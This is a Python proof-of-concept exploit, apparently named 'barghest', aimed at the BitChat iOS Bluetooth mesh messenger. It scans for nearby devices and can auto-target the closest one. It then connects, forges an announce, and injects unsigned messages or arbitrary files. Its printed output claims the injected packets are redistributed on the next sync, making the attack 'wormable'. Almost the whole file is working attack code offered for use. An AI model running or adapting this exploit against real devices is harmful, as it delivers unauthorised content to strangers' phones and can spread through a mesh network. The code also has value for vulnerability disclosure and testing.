#!/usr/bin/env python3

import asyncio
import struct
import time
import argparse
import secrets
import base64
import os
from dataclasses import dataclass
from typing import List

try:
    from bleak import BleakScanner, BleakClient
    from nacl.signing import SigningKey
    from nacl.public import PrivateKey
except ImportError as e:
    print(f"[!] missing dependency: {e}")
    print("[!] run: pip install bleak pynacl")
    exit(1)

SERVICE_UUID = "f47b5e2d-4a9e-4c5a-9b3f-8e1d2c3a4b5c"
CHAR_UUID = "a1b2c3d4-e5f6-4a5b-8c9d-0e1f2a3b4c5d"
PAYLOAD_MSG = "Pwned by BARGHEST"
NICK = "@0x0v1"

MSG_ANNOUNCE = 0x01
MSG_MESSAGE = 0x02
MSG_FRAGMENT = 0x20
MSG_FILE_TRANSFER = 0x22
FLAG_HAS_SIG = 0x02
FLAG_IS_RSR = 0x10
FLAG_HAS_RECIPIENT = 0x01

DEMO_PNG_B64 = (
    "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8/5+hHgAHggJ/PpGkswAAAABJRU5ErkJggg=="
)
DEMO_PNG = base64.b64decode(DEMO_PNG_B64)


@dataclass
class Identity:
    peer_id: bytes
    noise_pub: bytes
    signing_key: SigningKey
    signing_pub: bytes
    nick: str

    @classmethod
    def generate(cls, nick: str = NICK, anon_prefix: str = None) -> "Identity":
        noise_priv = PrivateKey.generate()
        sign_key = SigningKey.generate()
        if anon_prefix:
            hex_prefix = anon_prefix[:4].ljust(4, "0")
            try:
                prefix_bytes = bytes.fromhex(hex_prefix)
            except ValueError:
                print(f"[!] invalid hex prefix '{hex_prefix}', using random")
                prefix_bytes = secrets.token_bytes(2)
            peer_id = prefix_bytes + secrets.token_bytes(6)
        else:
            peer_id = secrets.token_bytes(8)
        return cls(
            peer_id=peer_id,
            noise_pub=bytes(noise_priv.public_key),
            signing_key=sign_key,
            signing_pub=bytes(sign_key.verify_key),
            nick=nick,
        )


def build_identity_tlv(nick: str, noise_pub: bytes, signing_pub: bytes) -> bytes:
    data = bytearray()
    nb = nick.encode()[:255]
    data.extend([0x01, len(nb)])
    data.extend(nb)
    data.extend([0x02, len(noise_pub)])
    data.extend(noise_pub)
    data.extend([0x03, len(signing_pub)])
    data.extend(signing_pub)
    return bytes(data)


def build_file_tlv(
    content: bytes,
    file_name: str = None,
    mime_type: str = "application/octet-stream",
    file_size: int = None,
) -> bytes:
    if not content:
        raise ValueError("empty content")

    if file_size is None:
        file_size = len(content)
    if file_size < 0 or file_size > 0xFFFFFFFF:
        raise ValueError("file_size out of range")

    out = bytearray()

    if file_name:
        name_bytes = file_name.encode("utf-8", errors="replace")
        if len(name_bytes) > 0xFFFF:
            name_bytes = name_bytes[:0xFFFF]
        out.append(0x01)
        out.extend(struct.pack(">H", len(name_bytes)))
        out.extend(name_bytes)

    out.append(0x02)
    out.extend(struct.pack(">H", 4))
    out.extend(struct.pack(">I", int(file_size)))

    if mime_type:
        mime_bytes = mime_type.encode("utf-8", errors="replace")
        if len(mime_bytes) > 0xFFFF:
            mime_bytes = mime_bytes[:0xFFFF]
        out.append(0x03)
        out.extend(struct.pack(">H", len(mime_bytes)))
        out.extend(mime_bytes)

    out.append(0x04)
    out.extend(struct.pack(">I", len(content)))
    out.extend(content)

    return bytes(out)


def pack_protocol_frame(
    msg_type: int,
    ttl: int,
    sender_id: bytes,
    payload: bytes,
    signature: bytes = None,
    is_rsr: bool = False,
    version: int = 1,
    recipient_id: bytes = None,
) -> bytes:
    data = bytearray()
    if version not in (1, 2):
        raise ValueError("unsupported version")
    data.append(version)
    data.append(msg_type)
    data.append(ttl)
    data.extend(struct.pack(">Q", int(time.time() * 1000)))
    flags = 0
    if recipient_id is not None:
        flags |= FLAG_HAS_RECIPIENT
    if signature:
        flags |= FLAG_HAS_SIG
    if is_rsr:
        flags |= FLAG_IS_RSR
    data.append(flags)
    if version == 2:
        data.extend(struct.pack(">I", len(payload)))
    else:
        data.extend(struct.pack(">H", len(payload)))
    data.extend(sender_id[:8].ljust(8, b"\x00"))
    if recipient_id is not None:
        data.extend(recipient_id[:8].ljust(8, b"\x00"))
    data.extend(payload)
    if signature:
        data.extend(signature[:64])
    return bytes(data)


def split_into_fragments(
    frame: bytes,
    original_type: int,
    sender_id: bytes,
    ttl: int = 0,
    is_rsr: bool = True,
    max_packet_len: int = 180,
    frag_version: int = 1,
    recipient_id: bytes = None,
) -> List[bytes]:
    if not frame:
        raise ValueError("empty frame")

    base_overhead = 14 + 8 + (8 if recipient_id is not None else 0)
    frag_hdr = 8 + 2 + 2 + 1
    max_data = max_packet_len - (base_overhead + frag_hdr)
    if max_data < 32:
        raise ValueError(f"max_packet_len too small ({max_packet_len})")

    frag_id = secrets.token_bytes(8)
    chunks = [frame[i : i + max_data] for i in range(0, len(frame), max_data)]
    total = len(chunks)
    if total <= 0 or total > 10000:
        raise ValueError(f"bad fragment total: {total}")

    out = []
    for idx, chunk in enumerate(chunks):
        payload = bytearray()
        payload.extend(frag_id)
        payload.extend(struct.pack(">H", idx))
        payload.extend(struct.pack(">H", total))
        payload.append(original_type & 0xFF)
        payload.extend(chunk)
        out.append(
            pack_protocol_frame(
                MSG_FRAGMENT,
                ttl,
                sender_id,
                bytes(payload),
                is_rsr=is_rsr,
                version=frag_version,
                recipient_id=recipient_id,
            )
        )
    return out


async def discover_bitchat_nodes(timeout: float = 10.0) -> List[dict]:
    print(f"[*] scanning for bitchat devices ({timeout}s)...")
    found_by_addr = {}

    def callback(device, adv):
        uuids = [u.lower() for u in (adv.service_uuids or [])]
        if SERVICE_UUID.lower() in uuids:
            name = device.name or getattr(adv, "local_name", None) or "?"
            addr = device.address
            prev = found_by_addr.get(addr)
            best_rssi = adv.rssi if prev is None else max(prev.get("rssi", -999), adv.rssi)
            found_by_addr[addr] = {"addr": addr, "name": name, "rssi": best_rssi}
            if prev is None:
                print(f"[+] {addr} ({name}) rssi={adv.rssi}")

    scanner = BleakScanner(callback)
    await scanner.start()
    await asyncio.sleep(timeout)
    await scanner.stop()

    found = sorted(found_by_addr.values(), key=lambda d: d.get("rssi", -999), reverse=True)
    if not found:
        print("[-] no devices found")
    return found


class Exploit:
    def __init__(
        self,
        target: str,
        ident: Identity,
        window_s: float = 0.0,
        interval_s: float = 1.0,
        send_mode: str = "message",
        file_path: str = None,
        file_name: str = None,
        file_mime: str = None,
        max_write: int = 180,
        frag_delay_s: float = 0.02,
    ):
        self.target = target
        self.ident = ident
        self.window_s = max(0.0, float(window_s))
        self.interval_s = max(0.1, float(interval_s))
        self.send_mode = send_mode
        self.file_path = file_path
        self.file_name = file_name
        self.file_mime = file_mime
        self.max_write = int(max(64, max_write))
        self.frag_delay_s = max(0.0, float(frag_delay_s))
        self.client = None
        self.char = None

    def create_announce_packet(self) -> bytes:
        payload = build_identity_tlv(self.ident.nick, self.ident.noise_pub, self.ident.signing_pub)
        unsigned = pack_protocol_frame(MSG_ANNOUNCE, 7, self.ident.peer_id, payload)
        sig = bytes(self.ident.signing_key.sign(unsigned).signature)
        return pack_protocol_frame(MSG_ANNOUNCE, 7, self.ident.peer_id, payload, signature=sig)

    def create_message_packet(self, msg: bytes) -> bytes:
        return pack_protocol_frame(MSG_MESSAGE, 0, self.ident.peer_id, msg, is_rsr=True)

    def create_file_transfer_packet(self, content: bytes, file_name: str, mime_type: str) -> bytes:
        payload = build_file_tlv(content=content, file_name=file_name, mime_type=mime_type)
        return pack_protocol_frame(MSG_FILE_TRANSFER, 0, self.ident.peer_id, payload, is_rsr=True, version=2)

    async def send_file_payload(self, content: bytes, file_name: str, mime_type: str) -> None:
        pkt = self.create_file_transfer_packet(content=content, file_name=file_name, mime_type=mime_type)
        if len(pkt) <= self.max_write:
            print(
                f"[*] sending file transfer (direct): name='{file_name}' mime='{mime_type}' bytes={len(content)} (pkt {len(pkt)} bytes)"
            )
            await self.client.write_gatt_char(self.char, pkt)
            return

        frags = split_into_fragments(
            frame=pkt,
            original_type=MSG_FILE_TRANSFER,
            sender_id=self.ident.peer_id,
            ttl=0,
            is_rsr=True,
            max_packet_len=self.max_write,
            frag_version=1,
            recipient_id=None,
        )
        print(
            f"[*] sending file transfer (fragmented): name='{file_name}' mime='{mime_type}' bytes={len(content)} frame={len(pkt)} max_write={self.max_write} frags={len(frags)} delay={self.frag_delay_s:.3f}s"
        )
        for i, fp in enumerate(frags):
            if i % 10 == 0 or i == len(frags) - 1:
                print(f"    [{i+1}/{len(frags)}] {len(fp)} bytes")
            await self.client.write_gatt_char(self.char, fp)
            if self.frag_delay_s:
                await asyncio.sleep(self.frag_delay_s)

    def _prepare_file_payload(self) -> tuple[bytes, str, str]:
        if self.file_path:
            with open(self.file_path, "rb") as f:
                content = f.read()
            name = self.file_name or os.path.basename(self.file_path) or "poc.bin"
            mime = self.file_mime or "application/octet-stream"
            return content, name, mime

        content = DEMO_PNG
        name = self.file_name or "poc.png"
        mime = self.file_mime or "image/png"
        return content, name, mime

    async def execute_attack(self) -> bool:
        print(f"\n[*] target: {self.target}")
        print(f"[*] attacker: {self.ident.nick} ({self.ident.peer_id.hex()[:8]})")

        try:
            print("[*] refreshing ble cache...")
            device = None
            try:
                device = await BleakScanner.find_device_by_address(self.target, timeout=5.0)
            except Exception as se:
                msg = str(se) if str(se) else type(se).__name__
                print(f"[!] refresh scan failed (non-fatal): {msg}")

            if not device:
                print("[-] device not found by address; rescanning for BitChat service...")
                candidates = await discover_bitchat_nodes(timeout=6.0)
                if len(candidates) == 1:
                    self.target = candidates[0]["addr"]
                    print(f"[+] resolved current address: {self.target}")
                elif len(candidates) > 1:
                    print("[!] multiple candidates found; use --auto or pick the right address:")
                    for d in candidates:
                        print(f"    {d['addr']} ({d['name']}) rssi={d['rssi']}")
                else:
                    print("[-] no BitChat adverts seen; trying direct connect anyway...")

            print("[*] connecting...")
            self.client = BleakClient(self.target, timeout=10.0)
            await self.client.connect()
            print("[+] connected")

            for svc in self.client.services:
                for c in svc.characteristics:
                    if c.uuid.lower() == CHAR_UUID.lower():
                        self.char = c
                        break

            if not self.char:
                print("[-] characteristic not found")
                return False

            print("[*] sending announce...")
            await self.client.write_gatt_char(self.char, self.create_announce_packet())
            print("[+] announce sent, waiting...")
            await asyncio.sleep(1.5)

            if self.send_mode in ("file", "both"):
                content, name, mime = self._prepare_file_payload()
                if len(content) > (1 * 1024 * 1024):
                    print(f"[-] refusing to send file > 1MiB (got {len(content)} bytes)")
                    return False
                await self.send_file_payload(content=content, file_name=name, mime_type=mime)
                print("[+] file transfer delivered")

            if self.send_mode == "file":
                return True

            if self.window_s > 0:
                print(
                    f"[*] sending multiple exploit packets for ~{self.window_s:.1f}s (interval {self.interval_s:.1f}s)..."
                )
                start = time.time()
                i = 0
                while (time.time() - start) < self.window_s:
                    msg = f"{PAYLOAD_MSG} #{i} {secrets.token_hex(2)}".encode()
                    pkt = self.create_message_packet(msg)
                    print(f"    [{i}] ttl=0, is_rsr=1, unsigned, {len(pkt)} bytes")
                    await self.client.write_gatt_char(self.char, pkt)
                    i += 1
                    await asyncio.sleep(self.interval_s)
                print(f"[+] delivered {i} payload(s) in ~{self.window_s:.1f}s")
            else:
                print("[*] sending exploit packet...")
                pkt = self.create_message_packet(PAYLOAD_MSG.encode())
                print(f"    ttl=0, is_rsr=1, unsigned, {len(pkt)} bytes")
                await self.client.write_gatt_char(self.char, pkt)
                print("[+] payload delivered")

            print("\n[*] exploit chain:")
            print("    1. rsr window open for our peer_id")
            print("    2. ttl=0 fallback accepts unsigned packet")
            print("    3. packet cached before rejection check")
            print("    4. redistributed on next sync (wormable)")
            return True

        except Exception as e:
            err = str(e) if str(e) else type(e).__name__
            print(f"[-] error: {err}")
            if "org.bluez" in str(e).lower() or not str(e):
                print("[!] hint: try removing pairing from bluetooth settings:")
                print("    sudo bluetoothctl remove " + self.target)
            return False
        finally:
            if self.client and self.client.is_connected:
                await self.client.disconnect()
                print("[*] disconnected")


async def cli_entrypoint():
    p = argparse.ArgumentParser(description="barghest - bitchat ios ble wormable poc")
    p.add_argument("--scan", action="store_true")
    p.add_argument("--target", type=str)
    p.add_argument("--auto", action="store_true")
    p.add_argument("--timeout", type=float, default=10.0)
    p.add_argument("--anon", type=str, metavar="XXXX")
    p.add_argument("--send", choices=["message", "file", "both"], default="message")
    p.add_argument("--file", type=str, default=None)
    p.add_argument("--file-name", type=str, default=None)
    p.add_argument("--file-mime", type=str, default=None)
    p.add_argument("--max-write", type=int, default=180)
    p.add_argument("--frag-delay", type=float, default=0.02)
    p.add_argument("--window", type=float, default=10.0)
    p.add_argument("--interval", type=float, default=1.0)
    args = p.parse_args()

    if not any([args.scan, args.target, args.auto]):
        p.print_help()
        return

    print("\nbarghest - bitchat ios ble wormable poc")
    print("=" * 40)

    ident = Identity.generate(anon_prefix=args.anon)
    print(f"[*] identity: {ident.nick}")
    print(f"[*] peer_id:  {ident.peer_id.hex()[:16]}")
    if args.anon:
        print(f"[*] display:  anon{args.anon[:4]}")

    target = args.target

    if args.scan or args.auto:
        devices = await discover_bitchat_nodes(args.timeout)
        if args.auto and devices:
            target = devices[0]["addr"]
            print(f"[*] auto-targeting: {target}")

    if target:
        exploit = Exploit(
            target,
            ident,
            window_s=args.window,
            interval_s=args.interval,
            send_mode=args.send,
            file_path=args.file,
            file_name=args.file_name,
            file_mime=args.file_mime,
            max_write=args.max_write,
            frag_delay_s=args.frag_delay,
        )
        ok = await exploit.execute_attack()
        if ok:
            if args.send == "message":
                print("\n[+] done. check target for message.")
            elif args.send == "file":
                print("\n[+] done. check target for incoming file.")
            else:
                print("\n[+] done. check target for incoming file + message.")
        else:
            print("\n[-] exploit failed")


if __name__ == "__main__":
    asyncio.run(cli_entrypoint())
